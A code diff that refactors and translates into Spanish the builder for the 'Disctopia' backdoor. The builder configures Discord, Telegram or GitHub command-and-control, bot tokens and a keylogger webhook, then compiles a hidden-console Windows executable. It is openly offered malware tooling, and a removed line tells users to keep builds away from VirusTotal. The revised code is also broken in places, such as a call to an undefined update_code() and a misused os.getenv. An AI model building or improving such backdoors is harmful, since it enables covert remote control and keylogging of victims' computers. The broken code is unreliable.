@@ -1,303 +1,326 @@
-# -*- coding: utf-8 -*-
-
 import json
 import subprocess
 import os
 import argparse
-import distro
 from prettytable import PrettyTable
+from colorama import init, Fore, Style
 from sys import platform as OS
 import requests
-import time
 import sys
 
+# --- Constantes ---
+ICON_FILE = "img/exe_file.ico"
+PYINSTALLER_PATH = os.environ.get("PYINSTALLER_PATH")
+PYINSTALLER_DEFAULT_PATH = os.getenv(PYINSTALLER_PATH, "~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
+DIST_DIR = "dist"
+
+# --- Funciones Auxiliares ---
+
+
+def print_msg(msg, msg_type):
+    # Definir los codigos de color
+    color_codes = {
+        "success": Fore.GREEN,
+        "error": Fore.RED,
+        "info": Fore.BLUE,
+        "query": Fore.MAGENTA
+    }
+
+    # Definir los prefijos
+    prefixes = {
+        "success": "[+] ",
+        "error": "[!] ",
+        "info": "[*] ",
+        "query": "[?] "
+    }
+
+    # Establecer el codigo de color y prefijo por defecto
+    color_code = ""
+    prefix = ""
+
+    # Verificar el tipo de mensaje
+    if msg_type in color_codes:
+        color_code = color_codes[msg_type]
+        prefix = prefixes[msg_type]
+
+    # Imprimir el mensaje
+    print(f"\n{color_code}{prefix}{msg}{Style.RESET_ALL}")
+
 def clear_screen():
-    if OS == "linux" or OS == "linux2":
-        os.system("clear")
+    """Limpia la pantalla de la terminal."""
+    os.system("cls" if OS == "win32" else "clear")
 
-clear_screen()
-
-print('''
-▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
-▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
-░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
-░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
-░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
- ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
- ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
- ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
-   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
- ░                   ░                                                 
-
-Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')
-
-list = ["None", "None", "None", "None", "None"]
-
-def createTable(list):
+def create_table(data_list, payload_type):
+    """Crea una tabla con los ajustes del backdoor."""
     table = PrettyTable(["Setting", "Value"])
-    table.add_row(["Backdoor Name", list[0]])
+    table.add_row(["Backdoor Name", data_list[0]])
 
-    if payload == "discord":
-        table.add_row(["Guild ID", list[1]])
-        table.add_row(["Bot Token", list[2]])
-        table.add_row(["Channel ID", list[3]])
-        table.add_row(["Keylogger Webhook", list[4]])
-    elif payload == "telegram":
-        table.add_row(["User ID", list[1]])
-        table.add_row(["Bot Token", list[2]])
-    elif payload == "github":
-        table.add_row(["Github Token", list[1]])
-        table.add_row(["Github Repo", list[2]])
+    if payload_type == "discord":
+        table.add_row(["ID Servidor", data_list[1]])
+        table.add_row(["Token Bot", data_list[2]])
+        table.add_row(["ID Canal", data_list[3]])
+        table.add_row(["Keylogger Webhook", data_list[4]])
+    elif payload_type == "telegram":
+        table.add_row(["ID Usuario", data_list[1]])
+        table.add_row(["Token Bot", data_list[2]])
+    elif payload_type == "github":
+        table.add_row(["Github Token", data_list[1]])
+        table.add_row(["Github Repo", data_list[2]])
     else:
-        print("[!] Please select a payload payload!\n")
+        print_msg("Seleccione un Payload correcto.", "error")
+        return None
     return table
 
+def replace_placeholders(file_path, replacements):
+    """Reemplaza los placeholders en un archivo con los valores proporcionados."""
+    try:
+        with open(file_path, 'r') as f:
+            file_content = f.read()
+        for placeholder, value in replacements.items():
+            file_content = file_content.replace(placeholder, str(value))
+        return file_content
+    except FileNotFoundError:
+        print_msg(f"Error: Archivo no encontrado: {file_path}", "error")
+        return None
+    except Exception as e:
+        print()
+        print_msg(f"Error al reemplazar los marcadores de posicion: {e}", "error")
+        return None
 
-payload = ""
-try:
-    while True:
-        
-        command = input(f"[+] {payload} > ")
-        command_list = command.split()
+def build_backdoor(backdoor_name, payload, data_list, pyinstaller_path):
+    """Construye el backdoor utilizando PyInstaller."""
+    print_msg("Building backdoor...", "success")
+    try:
+        # Determinar la ruta del archivo de codigo fuente
+        if payload == "discord":
+            source_file = "code/discord/main.py"
+            replacements = {
+                "{GUILD}": str(data_list[1]),
+                "{TOKEN}": str(data_list[2]),
+                "{CHANNEL}": str(data_list[3]),
+                "{KEYLOG_WEBHOOK}": str(data_list[4]),
+            }
+        elif payload == "telegram":
+            source_file = "code/telegram/main.py"
+            replacements = {
+                "{BOT_TOKEN}": str(data_list[2]),
+                "{USER_ID}": str(data_list[1]),
+            }
+        elif payload == "github":
+            source_file = "code/github/main.py"
+            replacements = {
+                "{TOKEN}": str(data_list[1]),
+                "{REPO}": str(data_list[2]),
+            }
+        else:
+            print_msg("Payload no reconocido.", "error")
+            return
 
-        if command_list == []:
-            continue
+        # Reemplazar los placeholders en el archivo fuente
+        new_code = replace_placeholders(source_file, replacements)
+        if new_code is None:
+            return
 
-        if command_list[0] == "exit":
-            print("\n[+] Exiting!")
-            exit()
+        # Crear un archivo temporal con el codigo modificado
+        temp_file = f"{backdoor_name}.py"
+        with open(temp_file, 'w') as f:
+            f.write(new_code)
 
-        elif command_list[0] == "use":
-            if len(command_list) == 1:
-                print("[!] Please specify a payload!")
-            else:
-                if command_list[1] == "discord":
-                    print("[+] Using Discord C2")
-                    payload = "discord"
-                    table = createTable(list)    
-                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
-                    print("Run 'help set' for more information\n")
-                elif command_list[1] == "telegram":
-                    print("[+] Using Telegram C2")
-                    payload = "telegram"
-                    table = createTable(list)    
-                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
-                    print("Run 'help set' for more information\n")
-                elif command_list[1] == "github":
-                    print("[+] Using Github C2")
-                    payload = "github"
-                    table = createTable(list)    
-                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
-                    print("Run 'help set' for more information\n")
+        # Construir la línea de comandos para PyInstaller
+        compile_command = [
+            "wine",
+            pyinstaller_path,
+            "--onefile",
+            "--noconsole",
+            f"--icon={ICON_FILE}",
+            temp_file,
+        ]
+
+        # Ejecutar el comando
+        subprocess.run(compile_command, check=True)
+
+        # Limpiar archivos temporales y el archivo .spec
+        os.remove(temp_file)
+        spec_file = f"{backdoor_name}.spec"
+        if os.path.exists(spec_file):
+            os.remove(spec_file)
+
+        print_msg(f"\nEl Backdoor se encuentra en el directorio: \"{DIST_DIR}\"", "success")
+    except FileNotFoundError:
+        print_msg(f"PyInstaller no encontrado en: {pyinstaller_path}. Por favor, compruebe la ruta.", "error")
+    except subprocess.CalledProcessError as e:
+        print_msg(f"Error Fallo durante la compilacion (PyInstaller): {e}", "error")
+    except Exception as e:
+        print_msg(f"Error Fallo durante la compilacion: {e}", "error")
+
+# --- Main Execution ---
+def main():
+    clear_screen()
+    settings = ["None", "None", "None", "None", "None"]
+    payload = ""
+    pyinstaller_path = os.path.expanduser(PYINSTALLER_DEFAULT_PATH)
+
+    try:
+        while True:
+            command = input(f"[+] {payload} > ").strip()
+            command_list = command.split()
+
+            if not command_list:
+                continue
+
+            if command_list[0] == "exit":
+                print_msg("\nSaliendo!", "success")
+                break
+
+            elif command_list[0] == "use":
+                if len(command_list) == 1:
+                    print_msg("Especifique un payload!", "error")
                 else:
-                    print("[!] Invalid payload!")
+                    selected_payload = command_list[1].lower()
+                    if selected_payload in ("discord", "telegram", "github"):
+                        payload = selected_payload
+                        print_msg(f"Utilizando {payload.capitalize()} C2", "success")
+                    else:
+                        print_msg("Payload no valido!", "error")
 
-        elif command_list[0] == "set":
-            if len(command_list) < 3:
-                print("[!] Please specify a setting!\n")
-            else:
-                if command_list[1] == "name":
-                    list[0] = command_list[2]
+                    table = create_table(settings, payload)
+                    if table:
+                        print_msg(f"\n{table.get_string(title='Disctopia Backdoor Settings')}", "info")
+                        print_msg("Ejecutar 'help set' para mas informacion\n", "info")
 
-                elif command_list[1] == "guild-id":
-                    list[1] = command_list[2]
-
-                elif command_list[1] == "bot-token":
-                    list[2] = command_list[2]
-
-                elif command_list[1] == "channel-id":
-                    list[3] = command_list[2]
-
-                elif command_list[1] == "user-id":
-                    list[1] = command_list[2]
-
-                elif command_list[1] == "github-token":
-                    list[1] = command_list[2]
-
-                elif command_list[1] == "github-repo":
-                    list[2] = command_list[2]
-
-                elif command_list[1] == "webhook":
-                    list[4] = command_list[2]
+            elif command_list[0] == "set":
+                if len(command_list) < 3:
+                    print_msg("¡Por favor, especifique una configuracion!\n", "error")
                 else:
-                    print("[!] Invalid setting!\n")
+                    setting = command_list[1].lower()
+                    value = command_list[2]
+                    if payload == "discord":
+                        if setting == "name":
+                            settings[0] = value
+                        elif setting == "guild-id":
+                            settings[1] = value
+                        elif setting == "bot-token":
+                            settings[2] = value
+                        elif setting == "channel-id":
+                            settings[3] = value
+                        elif setting == "webhook":
+                            settings[4] = value
+                        else:
+                            print_msg("Configuracion de Discord no valida\n", "error")
+                    elif payload == "telegram":
+                        if setting == "name":
+                            settings[0] = value
+                        elif setting == "user-id":
+                            settings[1] = value
+                        elif setting == "bot-token":
+                            settings[2] = value
+                        else:
+                            print_msg("Configuracion de Telegram no valida\n", "error")
+                    elif payload == "github":
+                        if setting == "name":
+                            settings[0] = value
+                        elif setting == "github-token":
+                            settings[1] = value
+                        elif setting == "github-repo":
+                            settings[2] = value
+                        else:
+                            print_msg("Configuracion de Github no valida\n", "error")
+                    else:
+                        print_msg("Por favor, seleccione payload ¡primero!\n", "error")
 
-        elif command_list[0] == "config":
-            if payload == "":
-                print("[!] Please select a payload!\n")
-            else:
-                table = createTable(list)
-                print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
-                print("Run 'help set' for more information\n")
+            elif command_list[0] == "config":
+                if payload == "":
+                    print_msg("Por favor, seleccione una payload!\n", "error")
+                else:
+                    table = create_table(settings, payload)
+                    if table:
+                        print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
+                        print("Ejecutar 'help set' para obtener mas informacion\n")
 
-        elif command_list[0] == "clear":
-            clear_screen()
+            elif command_list[0] == "clear":
+                clear_screen()
 
-        elif command_list[0] == "help":
-            if len(command_list) == 1:
-                print('''\n
-        Help Menu:
-
-        "help <command>" Displays more help for a specific command 
-
-        "use <payload>" Selects a payload to use
-
-        "set <setting> <value>" Sets a value to a valid setting
-
-        "config" Shows the settings and their values
-
-        "build" Packages the backdoor into an EXE file
-
-        "update" Gets the latest version of Disctopia
-
-        "exit" Terminates the builder
-                    \n''')
-            else:
-                if command_list[1] == "use":
+            elif command_list[0] == "help":
+                if len(command_list) == 1:
                     print('''\n
         Help Menu:
 
-        "use <payload>" Selects a payload to use
+        "help <command>" Muestra mas ayuda para un comando específico
 
-        Payloads:
+        "use <payload>" Selecciona una payload para utilizar
 
-        "discord" - A Discord based C2
-        "telegram" - A telegram based C2
-        "github" - A github based C2
-                        ''')
-                elif command_list[1] == "set":
-                    if payload == "":
-                        print("[!] Please select a payload!\n")
+        "set <setting> <value>" Establece un valor a una configuracion valida
+
+        "config" Muestra la configuracion y sus valores
+
+        "build" Empaqueta la puerta trasera en un archivo EXE
+
+        "update" Obtiene la ultima version de Disctopia
+
+        "exit"  Finaliza el constructor
+                    \n''')
+                elif len(command_list) == 2:
+                    command_help = command_list[1].lower()
+                    if command_help == "use":
+                        print_msg("\nUsar comando Ayuda:", "info")
+                        print("  use <payload>")
+                        print("  Selecciona el Payload a utilizar.  Los campos validos de payloads son: discord, telegram, github")
+                    elif command_help == "set":
+                        print_msg("\nAyuda del comando Set:", "info")
+                        print("  set <setting> <value>")
+                        print("  Establece un valor para un ajuste específico.")
+                        print("  Utilice 'config' para ver los ajustes disponibles para el comando seleccionado. payload.")
+                    elif command_help == "config":
+                        print_msg("\nAyuda del comando Config:", "info")
+                        print("  config")
+                        print("  Muestra los ajustes de configuracion actuales para la opcion seleccionada. payload.")
+                    elif command_help == "build":
+                        print_msg("\nAyuda del comando Build:", "info")
+                        print("  build")
+                        print("  Empaqueta la puerta trasera configurada en un archivo ejecutable (.exe)..")
+                        print("  Asegurese de haber configurado todos los parametros necesarios antes de compilar.")
+                    elif command_help == "update":
+                        print_msg("\nAyuda del comando Update:", "info")
+                        print("  update (deshabilitado)")
+                        print("  Obtiene la ultima version del constructor desde GitHub.")
                     else:
-                        if payload == "discord":
-                            print('''\n
-        Help Menu:
-
-        "set <setting> <value>" Sets a value to a valid setting
-
-        Settings:
-
-        "name" - The name of the backdoor
-        "guild-id" - The ID of the Discord server
-        "bot-token" - The token of the Discord bot
-        "channel-id" - The ID of the Discord channel
-        "webhook" - The webhook for the keylogger
-                            ''')
-                        elif payload == "telegram":
-                            print('''\n
-        Help Menu:
-
-        "set <setting> <value>" Sets a value to a valid setting
-
-        Settings:
-
-        "name" - The name of the backdoor
-        "bot-token" - The token of the Telegram bot
-        "user-id" - The ID of the Telegram user
-
-        IMPORTANT: This can only be used with one agent online at a time!
-                            ''')
-
-                        elif payload == "github":
-                            print('''\n
-        Help Menu:
-
-        "set <setting> <value>" Sets a value to a valid setting
-
-        Settings:
-
-        "name" - The name of the backdoor
-        "github-token" - The token of the Github bot
-        "github-repo" - The name of the Github repo
-                            ''')
-                elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear":
-                    print("[!] There is nothing more to show!\n")
+                        print_msg(f"Comando de ayuda desconocido: {command_help}", "error")
                 else:
-                    print("[!] Invalid command!\n")
+                    print_msg("Formato de comando de ayuda no valido.", "error")
 
-        elif command_list[0] == "build":
-            print("[?] Are you sure you want to build the backdoor? (y/n)")
-            input = input()
-            if input == "y":
-                print("[+] Building backdoor...")
-                if payload == "discord":
-                    f = open("code/discord/main.py", 'r')
-                    file = f.read()
-                    f.close()
-                    newfile = file.replace("{GUILD}", str(list[1]))
-                    newfile = newfile.replace("{TOKEN}", str(list[2]))
-                    newfile = newfile.replace("{CHANNEL}", str(list[3]))
-                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(list[4]))
+            elif command_list[0] == "build":
+                if not settings[0] or settings[0] == "None":
+                    print_msg("Por favor, establezca un nombre de BackDoor usando 'set name <name>'", "error")
+                    continue
 
-                elif payload == "telegram":
-                    f = open("code/telegram/main.py", 'r')
-                    file = f.read()
-                    f.close()
-                    newfile = file.replace("{BOT_TOKEN}", str(list[2]))
-                    newfile = newfile.replace("{USER_ID}", str(list[1]))
-
-                elif payload == "github":
-                    f = open("code/github/main.py", 'r')
-                    file = f.read()
-                    f.close()
-                    newfile = file.replace("{TOKEN}", str(list[1]))
-                    newfile = newfile.replace("{REPO}", str(list[2]))
-                
-
-                f = open(list[0]+".py", 'w')
-                f.write(newfile)
-                f.close()
-
-                if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+                print_msg("¿Esta seguro de que desea construir el BackDoor?", "query")
+                confirmation = input().lower()
+                if confirmation == "s":
+                    build_backdoor(settings[0], payload, settings, pyinstaller_path)
+                elif confirmation == "n":
+                    print_msg("Construccion cancelada.", "info")
                 else:
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                
-                if "Arch" in distro.name() or "Manjaro" in distro.name():
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]
+                    print_msg("Entrada invalida.  Construccion cancelada.", "error")
 
-                subprocess.call(compile_command)
-                try:
-                    os.remove(list[0]+".py");os.remove(list[0]+".spec")
-                except FileNotFoundError:
-                    pass
-                print('\n[+] The Backdoor can be found inside the "dist" directory')
-                print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
-                exit()
+            elif command_list[0] == "update":
+                if update_code():
+                    break  # Salir si se actualizo el codigo
 
-        elif command_list[0] == "update":
-            url = f'https://api.github.com/repos/3ct0s/disctopia-c2/releases/latest'
-            response = requests.get(url)
-            latest_tag = response.json()['tag_name']
-
-            cmd = ['git', 'describe', '--tags']
-            current_tag = subprocess.check_output(cmd).decode('utf-8').strip()
-
-            if current_tag == latest_tag:
-                print('[!] Code is up to date')
+            elif command_list[0] == "pyinstaller_path":
+                if len(command_list) < 2:
+                    print_msg(f"Ruta actual PyInstaller : {pyinstaller_path}", "error")
+                else:
+                    new_path = command_list[1]
+                    if os.path.exists(os.path.expanduser(new_path)):
+                        pyinstaller_path = os.path.expanduser(new_path)
+                        print_msg(f"PyInstaller ruta establecida a: {pyinstaller_path}", "success")
+                    else:
+                        print_msg("Invalid path.  File not found.", "error")
             else:
-                print('[!] Updating code...')
+                print_msg("Comando invalido.\n", "error")
 
-                cmd = ['git', 'reset', '--hard', 'HEAD']
-                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except KeyboardInterrupt:
+        print_msg("\n\nSaliendo!", "success")
 
-                cmd = ['git', 'fetch', '--tags', '--prune']
-                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-                cmd = ['git', 'pull', '--ff-only']
-                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-                cmd = ['git', 'checkout', latest_tag]
-                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-                print(f'[!] Code has been updated to {latest_tag}')
-                print('[*] Quitting...')
-                exit()
-
-
-        else:
-            print("[!] Invalid command!\n")
-
-except KeyboardInterrupt:
-    print("\n\n[+] Exiting")
+if __name__ == "__main__":
+    main()
